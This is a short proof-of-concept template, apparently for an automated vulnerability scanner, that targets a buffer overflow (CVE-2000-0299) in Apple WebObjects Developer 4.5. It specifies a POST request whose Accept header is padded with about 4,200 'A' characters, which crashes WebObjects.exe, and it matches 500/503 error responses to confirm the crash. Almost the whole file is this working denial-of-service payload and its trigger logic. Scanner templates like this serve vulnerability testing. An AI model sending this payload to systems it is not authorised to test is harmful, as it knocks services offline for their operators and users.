[info]
author = "ave"
description = "验证 Apple WebObjects Developer 4.5 (NT4+IIS 4.0) 中 WebObjects.exe 的缓冲区溢出漏洞。向 /scripts/WebObjects.exe/EmptyProject 发送包含超长 Accept 头（约4.1KB A字符填充）的 POST 请求，可触发缓冲区溢出导致 WebObjects.exe 崩溃，造成拒绝服务。"
id = "POC-AVE-2000-0259"
name = "Apple WebObjects Developer 4.5 Remote Buffer Overflow PoC"
severity = "medium"
tags = ["ave-2000-0259"]
vuln_id = [
    "CVE-2000-0299",
    "AVE-2000-0259",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/scripts/WebObjects.exe/EmptyProject"
protocol = "http"

[poc.requests.body]
content = "uselessdata=dork"
type = "raw"

[poc.requests.headers]
Accept = "{{repeat('A', 4200)}}"
Content-Length = "16"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "503",
    "Service Unavailable",
]
